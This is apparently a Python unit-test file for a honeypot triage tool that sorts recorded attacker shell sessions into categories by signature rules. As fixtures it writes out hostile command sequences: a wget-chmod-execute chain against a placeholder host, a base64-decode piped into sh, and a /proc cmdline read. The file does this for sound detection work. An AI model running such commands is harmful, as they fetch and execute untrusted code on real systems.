from contextlib import closing
from hashlib import sha256
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

import ingest
from match_signatures import load_rules
from session_triage import analyze_database, classify_session, review_unclassified

ROOT = Path(__file__).resolve().parents[1]


def rows(*commands):
    return [(f'2026-11-07T00:00:{i:02d}Z', cmd) for i, cmd in enumerate(commands)]


class SessionTriageTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def test_four_categories_and_priority(self):
        cases = [
            (rows('sh', 'enable', 'linuxshell'), 'shell_entry_only'),
            (rows('sh', 'uname -a'), 'individual_behavior'),
            (rows('ls /home'), 'individual_behavior'),
            (rows('enable', 'system'), 'unclassified'),
            (rows('sh', 'wget https://example.invalid/p -O p', 'chmod u+x p', './p'), 'linked_flow'),
            (rows('base64 -d input | sh'), 'linked_flow'),
        ]
        for commands, expected in cases:
            with self.subTest(commands=commands):
                result = classify_session(self.rules, commands)
                self.assertEqual(result['category'], expected)
                self.assertEqual(result['execution_status'], 'unverified')

    def test_cooccurrence_does_not_prove_flow(self):
        for commands in [
            rows('wget https://example.invalid/p -O a', 'chmod +x b', './a'),
            rows('./p', 'chmod +x p', 'wget https://example.invalid/p -O p'),
            rows('base64 -d input; sh'),
            rows('echo "wget example.invalid/p; chmod +x p; ./p"'),
        ]:
            with self.subTest(commands=commands):
                self.assertNotEqual(classify_session(self.rules, commands)['category'], 'linked_flow')

    def test_campaign_hint_is_not_behavior(self):
        result = classify_session(self.rules, rows('dota'))
        self.assertIn('C01', result['rule_ids'])
        self.assertEqual(result['category'], 'unclassified')

    def test_evidence_references_and_equal_time(self):
        commands = rows('wget https://example.invalid/p -O p', 'chmod +x p', './p')
        result = classify_session(self.rules, commands)
        evidence = result['linked_evidence'][0]['evidence'][0]
        self.assertEqual(evidence['target'], 'p')
        self.assertEqual([s['command_index'] for s in evidence['steps']], [0, 1, 2])
        equal = [(commands[0][0], cmd) for _, cmd in commands]
        self.assertNotEqual(classify_session(self.rules, equal)['category'], 'linked_flow')

    def test_review_candidates_not_detections(self):
        self.assertEqual(review_unclassified(rows('cd /proc && cat self/cmdline')),
                         ['process_cmdline_read_candidate'])
        self.assertEqual(classify_session(self.rules, rows('cd /proc && cat self/cmdline'))['category'],
                         'unclassified')

    def test_read_only_export_filters_isolation_and_counts(self):
        with tempfile.TemporaryDirectory() as temp:
            db, output = Path(temp) / 'test.db', Path(temp) / 'report'
            with closing(sqlite3.connect(db)) as con:
                con.executescript(ingest.SCHEMA)
                for source, sid, protocol, excluded, commands in [
                    ('a', 'same', 'ssh', 0, rows('sh')),
                    ('b', 'same', 'telnet', 0, rows('uname -a')),
                    ('a', 'unknown', 'ssh', 0, rows('enable')),
                    ('a', 'test', 'ssh', 1, rows('sh')),
                    ('a', 'web', 'http', 0, rows('sh')),
                ]:
                    con.execute('INSERT INTO sessions (source,session_id,protocol,excluded) VALUES (?,?,?,?)',
                                (source,sid,protocol,excluded))
                    for ts, command in commands:
                        con.execute('INSERT INTO commands (source,session_id,ts,command) VALUES (?,?,?,?)',
                                    (source,sid,ts,command))
                con.commit()
            before = sha256(db.read_bytes()).hexdigest()
            report = analyze_database(db, ROOT / 'signatures/rules.yaml', output)
            self.assertEqual(report['total_sessions'], 3)
            self.assertEqual(report['excluded_or_other_protocol_sessions_with_commands'], 2)
            self.assertEqual(sum(x['sessions'] for x in report['categories'].values()), 3)
            for category in ('shell_entry_only', 'individual_behavior', 'unclassified'):
                self.assertEqual(report['categories'][category]['sessions'], 1)
            self.assertEqual(sha256(db.read_bytes()).hexdigest(), before)
            self.assertEqual(len(json.loads((output / 'unclassified_review.json').read_text(encoding='utf-8'))), 1)
            self.assertTrue((output / 'sessions.csv').exists())


if __name__ == '__main__':
    unittest.main()
